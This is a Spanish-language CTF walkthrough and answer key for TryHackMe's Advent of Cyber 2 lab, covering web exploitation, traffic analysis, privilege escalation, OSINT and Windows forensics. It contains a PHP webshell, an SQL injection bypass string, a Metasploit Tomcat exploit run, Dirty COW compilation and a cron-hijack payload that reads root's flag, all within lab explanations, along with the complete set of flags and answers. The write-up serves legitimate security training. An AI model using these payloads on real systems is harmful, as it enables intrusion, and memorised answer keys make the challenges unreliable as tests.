# Advent of Cyber 2 [2020]

| **Dificultad** | Easy |
| **Tipo** | CTF derivado del contenido |
| **Slug** | `adventofcyber2` |
| **Link** | [TryHackMe](https://tryhackme.com/room/adventofcyber2) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | CyberChef / wfuzz / gobuster / sqlmap / ZAP / Wireshark / Nmap / enum4linux / smbclient / Metasploit / Ghidra |
| **Impacto** | Segundo calendario de adviento de TryHackMe: 24 días de retos guiados que recorren web, redes, OSINT, forense Windows, escalada de privilegios y contenedores. |

---

**Contexto:** Edición 2020 del Advent of Cyber. McSkidy y los duendes luchan contra el Grinch, que sabotea la infraestructura de Santa con cookies manipuladas, webshells, SQLi, XSS, ransomware y un servidor de juguetes comprometido. Cada tarea es un minilaboratorio autónomo: explotación web, análisis de tráfico con Wireshark, FTP/SMB, escalada con sudo y Dirty COW, OSINT, Python, ingeniería inversa con Ghidra, forense de Windows y un capítulo final estilo TRON con escape de contenedor vía lxd.

## Solucionario

### Task 1: Introducción

**Explicación:** Presentación de la edición 2020 del Advent of Cyber: 24 días de tareas diarias con teoría, vídeo y minilaboratorio. La narrativa sigue a McSkidy y los duendes contra el Grinch. Solo lectura informativa.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción del evento y comienza. | `No answer needed` |

### Task 2: Preparación del entorno

**Explicación:** Se configura el entorno de trabajo: elegir entre la AttackBox (Kali remota web) o la VPN con máquina propia, y verificar conectividad con el laboratorio. Tarea de configuración sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Configura la máquina de trabajo. | `No answer needed` |
| 2 | Configura el BattleBox/AttackBox. | `No answer needed` |
| 3 | Asegúrate de que la red funciona. | `No answer needed` |

### Task 3: Bienvenida al evento

**Explicación:** Presentación formal del evento y de la comunidad: cómo se resuelven las tareas diarias y dónde encontrar ayuda. Solo lectura y continuar con la historia.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Continúa con la historia del evento. | `No answer needed` |

### Task 4: Cómo jugar

**Explicación:** Explicación del formato: cada día publica una tarea con sus preguntas y respuestas exigidas de forma exacta, con máquinas desplegables. Solo lectura del formato.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el formato de las tareas diarias. | `No answer needed` |

### Task 5: Vídeo de apertura

**Explicación:** Vídeo introductorio que contextualiza el evento y los objetivos del calendario de adviento. Solo visualización.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Visualiza el vídeo de apertura. | `No answer needed` |

### Task 6: Día 1 - Autenticación (cookies)

**Explicación:** La aplicación guarda la sesión en la cookie `auth`, cuyo valor está en hexadecimal. Decodificándola (hex→ASCII) se obtiene un objeto JSON con `company` y `username`. La cookie de Santa es `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`. Cambiando `username` a `santa` se activa la línea de la fábrica y aparece la flag `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`. Lección: las codificaciones reversibles (hex/base64/JSON) no son seguridad.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Accede al portal y autentícate para generar tu cookie. | `No answer needed` |
| 2 | ¿Cuál es el nombre de la cookie usada para la autenticación? | `auth` |
| 3 | ¿En qué formato está codificado el valor de la cookie? | `Hexadecimal` |
| 4 | Tras decodificar la cookie, ¿en qué formato se almacenan los datos? | `JSON` |
| 5 | ¿Cuál es el valor de la cookie de Santa? | `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d` |
| 6 | ¿Qué flag se obtiene cuando la línea está totalmente activa? | `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` |

### Task 7: Día 2 - Subida de archivos

**Explicación:** Añadiendo `?id=ODIzODI5MTNiYmYw` a la URL se llega a la página de subida. El sitio solo valida de forma débil (dice que acepta `Image`), así que se sube una webshell PHP disfrazada que se guarda en `/uploads/`:

```php
<?php system($_GET['cmd']); ?>
```

Visitando `http://MACHINE_IP/uploads/shell.php?cmd=cat /var/www/flag.txt` se lee la flag `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`. Lección: validar tipo (magic bytes + extensión + contenido) en las subidas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué cadena de texto hay que añadir a la URL para acceder a la página de subida? | `?id=ODIzODI5MTNiYmYw` |
| 2 | ¿Qué tipo de archivo acepta el sitio? | `Image` |
| 3 | ¿En qué directorio se almacenan los archivos subidos? | `/uploads/` |
| 4 | Explota la subida de archivos para ejecutar código. | `No answer needed` |
| 5 | ¿Cuál es la flag en /var/www/flag.txt? | `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}` |

### Task 8: Día 3 - Descubriendo credenciales

**Explicación:** Laboratorio guiado de ataque de autenticación: capturar el tráfico del login o leer cómo se construye la petición revela las credenciales en claro. Al completar el ataque se obtiene la flag `THM{885ffab980e049847516f9d8fe99ad1a}`. Lección: credenciales que viajan sin proteger son interceptables en la red o en el código de la aplicación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Realiza el ataque de autenticación indicado en el laboratorio. | `No answer needed` |
| 2 | ¿Cuál es la flag? | `THM{885ffab980e049847516f9d8fe99ad1a}` |

### Task 9: Día 4 - Enumeración web y fuzzing

**Explicación:** Fuzzing de directorios y parámetros. La teoría usa wfuzz (`-c` color, `-z file,big.txt` lista y `FUZZ` la posición); para la URL de ejemplo sería `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`. Contra la máquina, GoBuster revela `site-log.php` en el directorio de la API, y fuzzeando su parámetro `date` el post correcto devuelve `THM{D4t3_AP1}`. Lección: la enumeración descubre rutas y parámetros ocultos.

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt http://MACHINE_IP/api/site-log.php?date=FUZZ
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Ejecuta la enumeración de directorios contra el objetivo desplegado. | `No answer needed` |
| 2 | Dada la URL "http://shibes.xyz/api.php", ¿cuál sería el comando wfuzz completo para consultar el parámetro "breed" con la wordlist "big.txt"? | `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ` |
| 3 | Usando GoBuster (contra el objetivo desplegado, no shibes.xyz) para encontrar el directorio de la API, ¿qué archivo hay? | `site-log.php` |
| 4 | Fuzzea el parámetro "date" del archivo encontrado en el directorio de la API. ¿Qué flag muestra el post correcto? | `THM{D4t3_AP1}` |

### Task 10: Día 5 - Inyección SQL en el panel de Santa

**Explicación:** Sin fuerza bruta (mirando el código fuente o enlaces), se localiza el panel `/santapanel`. Inyectando `' OR 1=1 -- -` en el login se bypasea. Dentro hay `22` regalos; Paul pidió `Github Ownership`; la flag es `thmfox{All_I_Want_for_Christmas_Is_You}` y la contraseña de admin `EhCNSWzzFP6sc7gB`. Lección: las consultas SQL concatenadas permiten alterar la lógica de autenticación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sin usar fuerza bruta de directorios, ¿cuál es el panel de login secreto de Santa? | `/santapanel` |
| 2 | Bypassea el login con inyección SQL. | `No answer needed` |
| 3 | ¿Cuántas entradas hay en la base de datos de regalos? | `22` |
| 4 | ¿Qué pidió Paul? | `Github Ownership` |
| 5 | ¿Cuál es la flag? | `thmfox{All_I_Want_for_Christmas_Is_You}` |
| 6 | ¿Cuál es la contraseña de admin? | `EhCNSWzzFP6sc7gB` |

### Task 11: Día 6 - Cross-Site Scripting (XSS)

**Explicación:** El foro renderiza el contenido sin sanear → XSS almacenado al inyectar `<script>`; la cadena de búsqueda `q` también se refleja → XSS reflejado. Con ZAP (`zaproxy`) un escaneo automatizado reporta `2` alertas XSS, y después se explota manualmente. Lección: validar y escapar el contenido antes de renderizarlo.

```bash
zaproxy
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Explora el foro y localiza el fallo de inyección. | `No answer needed` |
| 2 | ¿Qué tipo de vulnerabilidad se usó para explotar la aplicación? | `Stored cross-site scripting` |
| 3 | ¿Qué cadena de consulta puede abusarse para crear un XSS reflejado? | `q` |
| 4 | Prepara ZAP (zaproxy) contra el objetivo. | `No answer needed` |
| 5 | Ejecuta un escaneo automatizado de ZAP. ¿Cuántas alertas XSS hay? | `2` |
| 6 | Continúa con la explotación del XSS. | `No answer needed` |

### Task 12: Día 7 - Análisis de tráfico (Wireshark)

**Explicación:** Wireshark sobre dos PCAPs. En `pcap1.pcap` el ping inicial parte de `10.11.3.2`; el filtro `http.request.method == GET` muestra que `10.10.67.199` visitó `reindeer-of-the-week`. En `pcap2.pcap`, siguiendo el flujo FTP, la contraseña en claro es `plaintext_password_fiasco`, y el resto de la sesión es `SSH` (cifrada). La curiosidad final: McSkidy quiere un `Rubber ducky`. Lección: filtrar tráfico y seguir streams para localizar credenciales.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Abre "pcap1.pcap" en Wireshark. ¿Qué dirección IP inicia el ping/ICMP? | `10.11.3.2` |
| 2 | ¿Qué filtro usarías para ver solo peticiones HTTP GET en "pcap1.pcap"? | `http.request.method == GET` |
| 3 | Aplica este filtro. ¿Cómo se llama el artículo que visitó la IP "10.10.67.199"? | `reindeer-of-the-week` |
| 4 | Analiza "pcap2.pcap". ¿Qué contraseña se filtró durante el login FTP? | `plaintext_password_fiasco` |
| 5 | Continuando con "pcap2.pcap", ¿qué protocolo está cifrado? | `SSH` |
| 6 | ¿Qué quiere Elf McSkidy para sustituir a Elf McEager? | `Rubber ducky` |

### Task 13: Día 8 - Snort y Nmap

**Explicación:** Snort (IDS creado en `1998`) y Nmap. El escaneo muestra servicios en los puertos `80,2222,3389`; con `-O` la distribución reportada es `Ubuntu`; con el script `http-title` el título indica que la web es un `Blog`:

```bash
nmap -sV -O MACHINE_IP
nmap --script http-title MACHINE_IP
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuándo fue creado Snort? | `1998` |
| 2 | Usando Nmap sobre MACHINE_IP, ¿cuáles son los puertos de los tres servicios en ejecución? (en orden ascendente, separados por coma) | `80,2222,3389` |
| 3 | Despliega el objetivo y arranca el escaneo inicial. | `No answer needed` |
| 4 | Comprueba los resultados del escaneo de puertos. | `No answer needed` |
| 5 | Con Nmap, ¿qué distribución de Linux se reporta como la más probable? | `Ubuntu` |
| 6 | Usa el NSE de Nmap para obtener el "HTTP-TITLE". ¿Para qué crees que se usa la web? | `Blog` |
| 7 | Continúa con el análisis del objetivo. | `No answer needed` |

### Task 14: Día 9 - FTP anónimo

**Explicación:** El FTP permite el usuario anónimo. En el directorio `public` vive `backup.sh`, ejecutado por un cron. Santa tiene en su lista `The Polar Express`. Sobrescribiendo `backup.sh` con un payload se consigue el contenido de `/root/flag.txt`: `THM{even_you_can_be_santa}`. Lección: FTP abierto + cronjobs = ejecución de comandos.

```bash
#!/bin/bash
cat /root/flag.txt > /home/ftpuser/public/flag.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se llama el directorio del servidor FTP con datos accesibles por el usuario "anonymous"? | `public` |
| 2 | ¿Qué script se ejecuta dentro de este directorio? | `backup.sh` |
| 3 | ¿Qué película tenía Santa en su lista de compras de Navidad? | `The Polar Express` |
| 4 | Re-subida el script con datos maliciosos (como en la sección 9.6) y muestra el contenido de /root/flag.txt. | `THM{even_you_can_be_santa}` |

### Task 15: Día 10 - Samba

**Explicación:** Enumeración SMB con enum4linux: `3` usuarios y `4` shares. Con smbclient se comprueba que el share `tbfc-santa` no pide contraseña, y dentro está la carpeta `jingle-tunes` que McSkidy dejó para Santa. Lección: shares SMB sin protección exponen recursos internos.

```bash
enum4linux -a MACHINE_IP
smbclient //MACHINE_IP/tbfc-santa
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Usando enum4linux, ¿cuántos usuarios hay en el servidor Samba (MACHINE_IP)? | `3` |
| 2 | ¿Cuántos "shares" hay en el servidor Samba? | `4` |
| 3 | Usa smbclient para intentar entrar en los shares. ¿Qué share no requiere contraseña? | `tbfc-santa` |
| 4 | Entra en ese share. ¿Qué directorio dejó ElfMcSkidy para Santa? | `jingle-tunes` |

### Task 16: Día 11 - Escalada de privilegios (sudo)

**Explicación:** Escalada vertical: un usuario normal ejecuta comandos como root. Comprobando con `sudo -l` qué se permite y ejecutándolo, se lee `/root/flag.txt`: `thm{2fb10afe933296592}`. El archivo `sudoers` define estos privilegios. Lección: revisar siempre los derechos sudo concedidos.

```bash
sudo -l
sudo cat /root/flag.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué tipo de escalada de privilegios usa una cuenta de usuario para ejecutar comandos como administrador? | `Vertical` |
| 2 | ¿Cómo se llama el archivo que contiene la lista de usuarios del grupo sudo? | `sudoers` |
| 3 | Comprueba los privilegios sudo del usuario comprometido. | `No answer needed` |
| 4 | Escala privilegios para acceder a root. | `No answer needed` |
| 5 | ¿Cuál es el contenido del archivo /root/flag.txt? | `thm{2fb10afe933296592}` |

### Task 17: Día 12 - Apache Tomcat (Metasploit)

**Explicación:** Tomcat `9.0.17` vulnerable al CVE-2019-0232 (CGI Servlet → RCE). Con Metasploit se gana una sesión Meterpreter, se lee `flag1.txt` (`thm{whacking_all_the_elves}`) y se escala a root. Lección: versiones exactas de middleware → buscar su CVE.

```bash
msfconsole
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS MACHINE_IP
set LHOST tun0
run
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el número de versión del servidor web? | `9.0.17` |
| 2 | ¿Qué CVE puede usarse para crear una entrada Meterpreter en la máquina? (Formato: CVE-XXXX-XXXX) | `CVE-2019-0232` |
| 3 | Explota la máquina con Metasploit. | `No answer needed` |
| 4 | ¿Cuál es el contenido de flag1.txt? | `thm{whacking_all_the_elves}` |
| 5 | Escala a root y completa el reto. | `No answer needed` |

### Task 18: Día 13 - Escalada de privilegios (Dirty COW)

**Explicación:** Máquina Ubuntu `12.04` con `telnet` (protocolo obsoleto). Login con `clauschristmas`. El kernel es vulnerable a Dirty COW (CVE-2016-5195). Se compila con `gcc -pthread dirty.c -o dirty -lcrypt`, se ejecuta, se crea el usuario `firefart` con contraseña propia y se obtiene root; la salida termina mostrando el hash MD5 `8b16f00dd3b51efadb02c1df7f8427cc`. El contenido original del mensaje del usuario es `grinch`. Lección: kernels viejos sin parche = RCE local trivial.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina vulnerable. | `No answer needed` |
| 2 | Enumera los servicios expuestos. | `No answer needed` |
| 3 | ¿Qué protocolo/servicio antiguo y obsoleto está en ejecución? | `telnet` |
| 4 | ¿Qué credencial se te dejó? | `clauschristmas` |
| 5 | ¿Qué distribución de Linux y versión ejecuta el servidor? | `Ubuntu 12.04` |
| 6 | ¿Quién llegó primero? | `grinch` |
| 7 | Conéctate con las credenciales y comprueba el kernel. | `No answer needed` |
| 8 | ¿Cuál es la sintaxis literal para compilar, tomada de los comentarios del código fuente C real? | `gcc -pthread dirty.c -o dirty -lcrypt` |
| 9 | ¿Qué "nuevo" usuario crea la versión por defecto del código fuente C real? | `firefart` |
| 10 | Ejecuta el exploit y obtén una shell de root. | `No answer needed` |
| 11 | ¿Cuál es el hash MD5 de salida? | `8b16f00dd3b51efadb02c1df7f8427cc` |

### Task 19: Día 14 - OSINT (Ho-Ho-Hosint)

**Explicación:** OSINT sobre el usuario de Reddit `IGuidetheClaus2020`. Su historial de comentarios está en `/user/IGuidetheClaus2020/comments`; menciona Chicago (nacimiento), a Robert May (creador de Rudolph), usa Twitter con el mismo handle, sigue el Bachelorette, participó en el desfile de Chicago, y las fotos EXIF dan coordenadas `41.891815, -87.624277` con la flag `{FLAG}ALWAYSCHECKTHEEXIFD4T4`. En haveibeenpwned su contraseña filtrada es `spygame`, y el cruce ubica el hotel en el `540`. Lección: OSINT cruzando redes sociales, EXIF y brechas de datos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué URL te lleva directamente al historial de comentarios de Reddit de Rudolph? | `https://www.reddit.com/user/IGuidetheClaus2020/comments` |
| 2 | Según Rudolph, ¿dónde nació? | `Chicago` |
| 3 | Rudolph menciona a Robert. ¿Puedes decir su apellido con Google? | `May` |
| 4 | ¿En qué otra plataforma de redes sociales podría tener cuenta Rudolph? | `Twitter` |
| 5 | ¿Cuál es el nombre de usuario de Rudolph en esa plataforma? | `IGuideClaus2020` |
| 6 | ¿Cuál parece ser su programa de TV favorito ahora mismo? | `Bachelorette` |
| 7 | Por su historial de posts, participó en un desfile. ¿Dónde tuvo lugar? | `Chicago` |
| 8 | Encontraste la ciudad, pero ¿dónde exactamente se tomó una de las fotos? | `41.891815, -87.624277` |
| 9 | ¿Encontraste también una flag? | `{FLAG}ALWAYSCHECKTHEEXIFD4T4` |
| 10 | ¿Ha sido "pwned" Rudolph? ¿Qué contraseña suya apareció en una brecha? | `spygame` |
| 11 | Por todo lo recopilado, Rudolph está en la Windy City en un hotel de Magnificent Mile. ¿Cuál es el número de la dirección del hotel? | `540` |

### Task 20: Día 15 - Python

**Explicación:** Mini-lección de Python: `True + True` → `2`; `bool("False")` → `True` (cadena no vacía); `PyPi` es el índice de paquetes; `Requests` descarga HTML. El programa de la pregunta 5 devuelve `[1, 2, 3, 6]` porque las listas se pasan por referencia (`Pass by reference`) y la lista se muta aunque se reasigne dentro de la función.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la salida de True + True? | `2` |
| 2 | ¿Cómo se llama la base de datos para instalar librerías de otros desarrolladores? | `PyPi` |
| 3 | ¿Cuál es la salida de bool("False")? | `True` |
| 4 | ¿Qué librería permite descargar el HTML de una página web? | `Requests` |
| 5 | ¿Cuál es la salida del programa del "Código a analizar para la pregunta 5"? | `[1, 2, 3, 6]` |
| 6 | ¿Qué causa la salida anterior? | `Pass by reference` |

### Task 21: Día 16 - API del trineo de Santa

**Explicación:** Sin herramientas de enumeración (inspeccionando la web) se halla la API en `/api/` en el puerto `80`. Un endpoint indica que Santa está en `Winter Wonderland, Hyde Park, London`. La API key es un impar entre 0 y 100; probando con curl (con cuidado de no bloquear el servicio) se encuentra `57`. Lección: probar endpoints y valores de bajo rango para autenticaciones débiles.

```bash
curl "http://MACHINE_IP/api/findlocation.php?apikey=57"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el número de puerto del servidor web? | `80` |
| 2 | Sin herramientas de enumeración como Dirbuster, ¿cuál es el directorio de la API? (sin la API key) | `/api/` |
| 3 | ¿Dónde está Santa ahora mismo? | `Winter Wonderland, Hyde Park, London` |
| 4 | Encuentra la API key correcta. Recuerda: es un número impar entre 0 y 100 y, tras demasiados intentos, el trineo de Santa te bloqueará. | `57` |

### Task 22: Día 17 - Ingeniería inversa (Ghidra)

**Explicación:** Con Ghidra se sigue un binario: la primera `movl` asigna `1` a `local_ch`; la `imull` multiplica `eax` (que vale `6`); y antes del `xor` que pone `eax` a 0, `local_4h` vale `6`. Lección: leer el flujo de instrucciones (mov → imul → mov → xor) para deducir valores.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el valor de local_ch cuando se llama a la instrucción movl correspondiente (la primera si hay varias)? | `1` |
| 2 | ¿Cuál es el valor de eax cuando se llama a la instrucción imull? | `6` |
| 3 | ¿Cuál es el valor de local_4h antes de que eax se ponga a 0? | `6` |

### Task 23: Día 18 - Crackeo de contraseñas

**Explicación:** Se extrae un hash y se crackea con una wordlist; la contraseña de Santa es `santapassword321`. Al iniciar sesión con ella, la web muestra la flag `thm{046af}`. Lección: hashes sin salt + contraseñas débiles se recuperan en segundos.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Obtén el hash y prepáralo para crackearlo. | `No answer needed` |
| 2 | ¿Cuál es la contraseña de Santa? | `santapassword321` |
| 3 | Ahora que recuperaste la contraseña, intenta iniciar sesión... ¿Cuál es la flag? | `thm{046af}` |

### Task 24: Día 19 - Explotación web (Naughty List)

**Explicación:** La "Naughty List" usa una frase como contraseña de Santa: `Be good for goodness sake!`. Entrando con ella se obtiene `THM{EVERYONE_GETS_PRESENTS}`. Lección: frases como secretos y credenciales hardcodeadas en el front-end son triviales de explotar si se entiende la mecánica del sitio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña de Santa? | `Be good for goodness sake!` |
| 2 | ¿Cuál es la flag del reto? | `THM{EVERYONE_GETS_PRESENTS}` |

### Task 25: Día 20 - Windows Forensics (los Elfos)

**Explicación:** Forense Windows: el Elfo 1 (archivo oculto en Documents) quiere `2 front teeth`; el Elfo 2 (carpeta oculta en el escritorio) quiere la película `Scrooged`; el Elfo 3 está en la carpeta oculta `3lfthr3e` de C:\Windows con dos archivos: el primero tiene `9999` palabras y las de los índices 551 y 6991 son `Red Ryder`; buscando esa frase en el segundo archivo, el Elfo 3 quiere un `Red Ryder BB Gun`. Lección: activar "mostrar archivos ocultos" y analizar contenido de texto en triage forense.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Busca el primer archivo elfo oculto dentro de la carpeta Documents. Léelo. ¿Qué quiere el Elfo 1? | `2 front teeth` |
| 2 | Busca en el escritorio una carpeta oculta con el archivo del Elfo 2. ¿Cómo se llama la película que quiere? | `Scrooged` |
| 3 | Busca en el directorio de Windows una carpeta oculta con los archivos del Elfo 3. ¿Cómo se llama la carpeta oculta? | `3lfthr3e` |
| 4 | ¿Cuántas palabras contiene el primer archivo? | `9999` |
| 5 | ¿Qué 2 palabras están en los índices 551 y 6991 del primer archivo? | `Red Ryder` |
| 6 | Esto es solo la mitad. Busca en el segundo archivo la frase de la pregunta anterior. ¿Qué quiere el Elfo 3? | `Red Ryder BB Gun` |

### Task 26: Día 21 - Windows Forensics (hashes y strings)

**Explicación:** En Documents: el hash de `db.exe` es `596690FFC54AB6101932856E6A78E3A1` y el del ejecutable misterioso `5F037501FB542AD2D9B06EB12AED09F0`. Con `strings64` sobre este último se localiza la flag oculta `THM{f6187e6cbeb1214139ef313e108cb6f9}`, y ejecutando el conector db.exe se imprime `THM{3088731ddc7b9fdeccaed982b07c297c}`. Lección: hashes para identificar muestras y strings para extraer información incrustada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el archivo de texto de la carpeta Documents. ¿Cuál es el hash del archivo db.exe? | `596690FFC54AB6101932856E6A78E3A1` |
| 2 | ¿Cuál es el hash del ejecutable misterioso en la carpeta Documents? | `5F037501FB542AD2D9B06EB12AED09F0` |
| 3 | Usando Strings, encuentra la flag oculta dentro del ejecutable. | `THM{f6187e6cbeb1214139ef313e108cb6f9}` |
| 4 | ¿Qué flag se muestra al ejecutar el conector de la base de datos? | `THM{3088731ddc7b9fdeccaed982b07c297c}` |

### Task 27: Día 22 - KeePass

**Explicación:** La base KeePass se abre con `thegrinchwashere`. Los valores de la columna password están codificados en `Base64` (campo 'Matching ops'). Decodificando: el Elf Server usa `sn0wM4n!` y ElfMail `ic3Skating!`. En esta edición la tarea solo pide usar los datos obtenidos (no hay pregunta de flag). Lección: contraseñas puestas en base64 dentro del gestor equivalen a contraseñas en claro.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña de la base de datos KeePass? | `thegrinchwashere` |
| 2 | ¿Qué método de codificación aparece como 'Matching ops'? | `Base64` |
| 3 | ¿Cuál es el valor decodificado de la contraseña del Elf Server? | `sn0wM4n!` |
| 4 | ¿Cuál es el valor decodificado de la contraseña de ElfMail? | `ic3Skating!` |
| 5 | Sigue los pasos para usar los datos obtenidos. | `No answer needed` |

### Task 28: Día 23 - Ransomware (Windows Forensics)

**Explicación:** La nota de rescate esconde una "dirección bitcoin" que descifrada da `nomorebestfestivalcompany`; los archivos cifrados cambian a `.grinch`; la tarea programada sospechosa es `opidsfsdf` que ejecuta `C:\users\administrator\desktop\opidsfsdf.exe`; otra tarea limpió los VSS con ID `7a9eea15-0000-0000-0000-010000000000`; montando la partición oculta aparece `Confidential` y con 'Previous Versions' se restaura el archivo cuya contraseña es `m33pa55w0rdIZseecure!`. Lección: los VSS/versiones previas son clave en respuestas a ransomware.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Descifra la 'dirección bitcoin' falsa de la nota de rescate. ¿Cuál es el valor en texto plano? | `nomorebestfestivalcompany` |
| 2 | A veces el ransomware cambia la extensión de los archivos cifrados. ¿Cuál es la extensión de cada archivo cifrado? | `.grinch` |
| 3 | ¿Cómo se llama la tarea programada sospechosa? | `opidsfsdf` |
| 4 | Inspecciona las propiedades de la tarea. ¿Dónde está el ejecutable que se lanza al iniciar sesión? | `C:\users\administrator\desktop\opidsfsdf.exe` |
| 5 | Hay otra tarea programada relacionada con VSS. ¿Cuál es el ID de ShadowCopyVolume? | `7a9eea15-0000-0000-0000-010000000000` |
| 6 | Asigna una letra a la partición oculta. ¿Cómo se llama la carpeta oculta? | `Confidential` |
| 7 | Usa la pestaña 'Previous Versions' para restaurar el archivo cifrado. ¿Cuál es la contraseña dentro del archivo? | `m33pa55w0rdIZseecure!` |

### Task 29: Día 24 - TRON (web + Docker)

**Explicación:** Máquina final: puertos `80, 65000`, web oculta titulada `Light Cycle`. GoBuster revela `uploads.php` y la carpeta `grid` de subidas. Se sube webshell → `web.txt` = `THM{ENTER_THE_GRID}`. La config del servidor web da `tron:IFightForTheUsers`; la BD `tron` guarda credenciales cifradas que crackeadas dan `@computer@`; SSH como `tron` → `user.txt` = `THM{IDENTITY_DISC_RECOGNISED}`. El usuario está en el grupo `lxd`, que permite montar el host desde un contenedor y leer `root.txt` = `THM{FLYNN_LIVES}`. Lección: acceso al grupo lxd = root.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Escanea la máquina. ¿Qué puertos están abiertos? | `80, 65000` |
| 2 | ¿Cuál es el título de la web oculta? (mira recursivamente todas las webs del box) | `Light Cycle` |
| 3 | ¿Cuál es el nombre de la página php oculta? | `uploads.php` |
| 4 | ¿Cuál es el nombre del directorio oculto donde se guardan las subidas? | `grid` |
| 5 | Explota la subida de archivos para obtener una shell. | `No answer needed` |
| 6 | ¿Cuál es el valor de la flag web.txt? | `THM{ENTER_THE_GRID}` |
| 7 | Encuentra y compromete el sistema destino. | `No answer needed` |
| 8 | Revisa los archivos de configuración del servidor web. ¿Qué credenciales encuentras? (usuario:contraseña) | `tron:IFightForTheUsers` |
| 9 | Accede a la base de datos y descubre las credenciales cifradas. ¿Cómo se llama la base de datos? | `tron` |
| 10 | Crackea la contraseña. ¿Cuál es? | `@computer@` |
| 11 | Conéctate por SSH con las credenciales obtenidas. | `No answer needed` |
| 12 | ¿Cuál es el valor de la flag user.txt? | `THM{IDENTITY_DISC_RECOGNISED}` |
| 13 | Revisa los grupos del usuario. ¿Qué grupo puede aprovecharse para escalar privilegios? | `lxd` |
| 14 | Abusa de este grupo para escalar a root. | `No answer needed` |
| 15 | ¿Cuál es el valor de la flag root.txt? | `THM{FLYNN_LIVES}` |

### Task 30: Conclusión

**Explicación:** Cierre del evento: Fred, el administrador del trineo, pide el resumen. La flag de reconocimiento es `thm{thank_you_2020}`; después solo queda ver el vídeo final y completar la encuesta del evento.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Fred, el administrador del trineo, te pregunta cómo ha ido el evento. Responde con la flag de reconocimiento. | `thm{thank_you_2020}` |
| 2 | Continúa con el siguiente vídeo/fin del evento. | `No answer needed` |
| 3 | Termina la encuesta del evento. | `No answer needed` |

---

**Metodología:** Cada día es autocontenido. Los días web comienzan con Burp/DevTools para cookies (hex→JSON), siguen con subida de archivos PHP, fuzzing (wfuzz/gobuster), SQLi manual en /santapanel y XSS validado con ZAP. Los días de red usan Wireshark (filtros http), Nmap con scripts NSE, FTP anónimo y enum4linux+smbclient. La escalada de privilegios pasa por sudo, Tomcat (CVE-2019-0232) y Dirty COW (compilando dirty.c). Termina con forense Windows (KeePass, ransomware y Previous Versions) y un servidor TRON donde el abuso del grupo lxd permite leer root flag.

**Learning chain:** manipulación de cookies → subida de archivos → fuzzing → SQLi → XSS → análisis de tráfico → servicios de red → escalada de privilegios → OSINT → Python → ingeniería inversa → forense Windows → ransomware → contenedores (lxd).

**MITRE ATT&CK:** T1087 (Account Discovery), T1190 (Exploit Public-Facing Application), T1213 (Data from Information Repositories), T1486 (Data Encrypted for Impact), T1548 (Abuse Elevation Control Mechanism), T1566 (Phishing), T1059 (Command and Scripting Interpreter)

**Fuente:** [TryHackMe - Advent of Cyber 2 [2020]](https://tryhackme.com/room/adventofcyber2)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
